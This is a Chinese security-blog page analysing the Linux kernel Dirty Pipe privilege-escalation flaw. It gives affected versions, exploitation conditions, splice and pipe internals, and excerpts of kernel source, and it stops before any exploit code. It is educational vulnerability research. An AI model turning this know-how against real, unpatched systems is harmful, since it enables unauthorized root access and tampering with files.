<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/15/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/15/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/" class="post-title-link" itemprop="url">Kernel 现实漏洞复现：Dirty Pipe</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-27 18:14:07" itemprop="dateCreated datePublished" datetime="2022-11-27T18:14:07+08:00">2022-11-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-02-26 01:44:48" itemprop="dateModified" datetime="2024-02-26T01:44:48+08:00">2024-02-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Pipe 漏洞成因</strong></p>
<p>攻击者可以利用该漏洞实现低权限用户提升至 root 权限，且能对主机任意可读文件进行读写</p>
<p>攻击适用版本：</p>
<ul>
<li>Linux Kernel版本 &gt;= 5.8</li>
<li>Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</li>
</ul>
<p>攻击适用条件：</p>
<ul>
<li>攻击者必须有读权限（因为它需要通过 <code>splice</code> 方法将将页输入管道中）</li>
<li>偏移量不能在页边界上（因为页上至少有一个字节已经拼接到管道中）</li>
<li>写入不能跨越页边界（因为这将为其余部分创建一个新的匿名缓冲区）</li>
<li>文件无法调整大小（因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据）</li>
<li>单次写入的长度不能超过一页（因为页大小为4K）</li>
</ul>
<p>该漏洞源于新管道缓冲区结构的“flag”变量在 Linux 内核中的 <code>copy_page_to_iter_pipe</code> 和 <code>push_pipe</code> 函数中缺乏正确的初始化</p>
<p><strong>前置知识 - Page Cache &amp; splice</strong></p>
<p>Page Cache 即缓存管理机制，一般当我们访问一个磁盘文件的时候，首先内核会将其内容装载到 Page Cache 内存中，后续都是直接读取内存中的 Page Cache 来访问数据，内核会在合适的时机将标脏的 Page 给写回磁盘中</p>
<ul>
<li>如果用户进程使用 read/write 读写文件，那么内核会先将载入数据的物理内存映射到内核虚拟内存 buffer，然后再将内核的 buffer 数据拷贝到用户态</li>
<li>如果追求效率，内核也提供一种零拷贝模式（不发生系统调用，跨越用户和内核的边界做上下文切换），用户进程可以使用 mmap 直接将用户态的 buffer 映射到物理内存，不需要进行系统调用，直接访问自己的 mmap 区域即可访问到那段物理内存内容</li>
</ul>
<p>splice 系统调用通过一种“零拷贝”的方法将文件内容输送到管道之中，相比传统的直接将文件内容送入管道性能更好</p>
<ul>
<li>经典的 <code>read/write</code> 方式：利用用户态数据 <code>buf</code> 作为文件缓存</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(len)  		<span class="comment">// 首先申请一块长度为len的内存</span></span><br><span class="line">read(fd1, buf, len)  	<span class="comment">// 将第一个文件fd1中len长度的数据读入buf</span></span><br><span class="line">write(fd2, buf, len) 	<span class="comment">// 将buf中的数据写入文件fd2中</span></span><br></pre></td></tr></table></figure>
<ul>
<li>零拷贝 <code>splice</code>：在数据发送的过程中，不需要在用户态为数据申请 <code>buf</code>，也就是不会产生用户态、内核态之间的数据拷贝 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">splice</span><span class="params">(<span class="keyword">int</span> fd_in, <span class="keyword">loff_t</span> *off_in, <span class="keyword">int</span> fd_out,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>在两个文件描述符之间移动数据，而无需在内核地址空间和用户地址空间之间进行复制</li>
<li>它从文件描述中传输最多 <code>len</code> 字节的数据</li>
<li>将 <code>fd_in</code> 传递到文件描述符 <code>fd_out</code>，其中文件描述符之一必须引用管道</li>
</ul>
<p>splice 在内核中对应的接口如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(splice, <span class="keyword">int</span>, fd_in, <span class="keyword">loff_t</span> __user *, off_in,</span><br><span class="line">		<span class="keyword">int</span>, fd_out, <span class="keyword">loff_t</span> __user *, off_out,</span><br><span class="line">		<span class="keyword">size_t</span>, len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!len))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = -EBADF;</span><br><span class="line">	in = fdget(fd_in); <span class="comment">/* 找到输入文件 */</span></span><br><span class="line">	<span class="keyword">if</span> (in.file) &#123;</span><br><span class="line">		out = fdget(fd_out); <span class="comment">/* 找到输出文件 */</span></span><br><span class="line">		<span class="keyword">if</span> (out.file) &#123;</span><br><span class="line">			error = do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">					  len, flags); <span class="comment">/* 真正的移动数据 */</span></span><br><span class="line">			fdput(out);</span><br><span class="line">		&#125;</span><br><span class="line">		fdput(in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>调用链如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_splice -&gt; do_splice -&gt; []</span><br><span class="line">[pipe to pipe]-&gt; splice_pipe_to_pipe -&gt; ()</span><br><span class="line">[pipe to file]-&gt; do_splice_to -&gt; ()</span><br><span class="line">[file to pipe]-&gt; do_splice_from -&gt; f_op-&gt;splice_read(generic_file_splice_read) -&gt; call_read_iter -&gt; f_op-&gt;read_iter(copy_folio_to_iter) -&gt; ... -&gt; copy_page_to_iter -&gt; copy_page_to_iter_pipe</span><br></pre></td></tr></table></figure>
<ul>
<li>其中 <code>copy_page_to_iter_pipe</code> 对“flag”变量没有进行初始化</li>
</ul>
<p>使用 <code>splice</code> 将数据从文件导入到管道中：（<code>file to pipe</code>）</p>
<ul>
<li>首先将数据加载到文件页面缓存 <code>page cache</code> 中</li>
<li>然后创建一个管道缓冲区 <code>pipe_buffer</code> </li>
<li>直接 <code>pipe_buffer-&gt;page = page cache</code>，把 <code>page cache</code> 当做 <code>pipe_buffer</code> 的缓存页</li>
</ul>
<p>如果此时该管道还想存储从其他输入流传输来的数据，就只能重新申请 <code>pipe_buffer</code>，不能直接附加到刚才的 <code>pipe_buffer</code> 中，因为该 <code>page</code> 是文件的缓存页面，不属于管道，但 Dirty Pipe 利用了一种方法使该页面可以被管道写入</p>
<p><strong>前置知识 - Pipe</strong></p>
<p>管道 Pipe 是一种经典的 IPC 通信方式：</p>
<ul>
<li>它包含一个输入端和一个输出端，程序将数据从一段输入，从另一端读出</li>
<li>在内核中，为了实现这种数据通信，需要以页面 Page 为单位维护一个环形缓冲区（被称为 <code>ring_buffer</code>），里面存了16个 <code>pipe_buffer</code> 结构，每个 <code>pipe_buffer</code>  结构又有一个指针指向一个表示物理内存页 Page 的结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* 用于描述一个物理页 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; </span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* 对应操作管道的函数指针 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>每个 Page 大小为 4KB，页面之间并不连续</li>
<li>管道维护两个引用计数器，一个用来写 (pipe-&gt;head)，一个用来读 (pipe-&gt;tail)，可以被循环利用</li>
<li>当前页面带有 <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag 时，如果将标记且续写后的数据长度不超过一页时，则可以进行续写</li>
</ul>
<p>管道描述符 <code>pipe_inode_info</code>，用于表示一个管道，存储管道相应的信息： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head; <span class="comment">/* 缓冲区生成点 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail; <span class="comment">/* 缓冲区消耗点 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* 该管道的当前读者数量(每次以读方式打开时,readers加1,关闭时readers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* 该管道的当前写者数量(每次以写方式打开时,writers加1,关闭时writers减1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files; <span class="comment">/* 引用此管道的file结构体数量 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter; <span class="comment">/* 管道读者记数器,每次以读方式打开管道时,r_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter; <span class="comment">/* 管道写者计数器,每次以写方式打开管道时,w_counter加1,关闭是不变 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span> <span class="comment">/* 页缓存,可以加速页帧的分配过程,当释放页帧时将页帧记入tmp_page,当分配页帧时,优先从tmp_page中获取(如果tmp_page为空才从伙伴系统中获取) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span> <span class="comment">/* 读端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span> <span class="comment">/* 写端异步描述符 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">/* 回环缓冲区(由16个pipe_buffer对象组成,每个pipe_buffer对象拥有一个内存页) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span> <span class="comment">/* 创建此管道的用户 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管道可以分为命名管道和匿名管道：</p>
<ul>
<li>命名管道是一个有名字的实体文件</li>
<li>匿名管道就是我们常使用的管道符创建的管道</li>
</ul>
<p>本质上来讲，管道就是一种进程间的通信手段，让两个进程可以通过 pipe 发送和接收数据（匿名管道可用于父子与兄弟进程之间的通信，有名管道则用于两个无关进程的通信）</p>
<p>这里我们重点分析实现管道写的函数 <code>pipe_write</code>：</p>
<ul>
<li>装载了文件缓存页面 <code>page tcache</code> 的 <code>pipe_buffer</code> 不能被该管道续写（因为写入该管道的数据将会被写入文件）</li>
<li>我们来看一下究竟是哪里限制了管道的写入：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="keyword">ssize_t</span> chars;</span><br><span class="line">	<span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">		send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">		ret = -EPIPE;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">		ret = -EXDEV;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	head = pipe-&gt;head; <span class="comment">/* 获取缓冲区生成点(用于写入) */</span></span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">/* 检查管道是否为空 */</span> </span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; <span class="comment">/* 缓存页不为空 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">/* 通过head索引到对应的pipe_buffer */</span></span><br><span class="line">		<span class="keyword">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 如果flag为PIPE_BUF_FLAG_CAN_MERGE则允许在当前页面续写 */</span></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">  </span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf); <span class="comment">/* 检查是否写跨页 */</span></span><br><span class="line">			<span class="keyword">if</span> (ret)</span><br><span class="line">				<span class="keyword">goto</span> out; <span class="comment">/* 会引发写跨页(分配一个新的内存页来装数据) */</span></span><br><span class="line"></span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from); <span class="comment">/* 将数据从用户传来的from,拷贝到pipe_buf-&gt;page */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			<span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line">				<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">		wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">	__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">		kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = file_update_time(filp);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			ret = err;</span><br><span class="line">		sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>重点注意该函数对 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 的处理，如果 flag 中有该标志位，就会调用 <code>copy_page_from_iter</code> 函数将数据复制到管道缓冲区</li>
</ul>
<p><strong>Dirty Pipe 漏洞利用</strong></p>
<p>对于能否将数据附加至一个管道缓冲区，内核采用了如下的机制： </p>
<ul>
<li>Linux 2.6.16 以前，<code>pipe_buf_operations</code> 结构有一个单独的 flag 叫做 <code>can_merge</code>，下面这行 if 语句通过则允许在当前页面续写</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ops-&gt;can_merge &amp;&amp; offset + chars &lt;= PAGE_SIZE) &#123;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 2.6.16 起，为了支持 <code>splice</code> 调用，引入了 <code>page_cache_pipe_buf_ops</code>，它实际上是一个设置了 <code>can_merge=0</code> 的 <code>pipe_buf_operations</code>，用来指示这部分页不能被管道写入</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> <span class="title">page_cache_pipe_buf_ops</span> =</span> &#123;</span><br><span class="line">	.can_merge = <span class="number">0</span>,</span><br><span class="line">	.<span class="built_in">map</span> = generic_pipe_buf_map,</span><br><span class="line">	.unmap = generic_pipe_buf_unmap,</span><br><span class="line">	.confirm = page_cache_pipe_buf_confirm,</span><br><span class="line">	.release = page_cache_pipe_buf_release,</span><br><span class="line">	.steal = page_cache_pipe_buf_steal,</span><br><span class="line">	.get = generic_pipe_buf_get,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux 5.0 中，由于只有一种管道缓冲区类型可以追加新数据，对 <code>can_merge</code> 的检查被修改为只检查类型是否是 <code>anon_pipe_buf_ops</code>（这就是那个唯一可追加内容的类型）</li>
</ul>
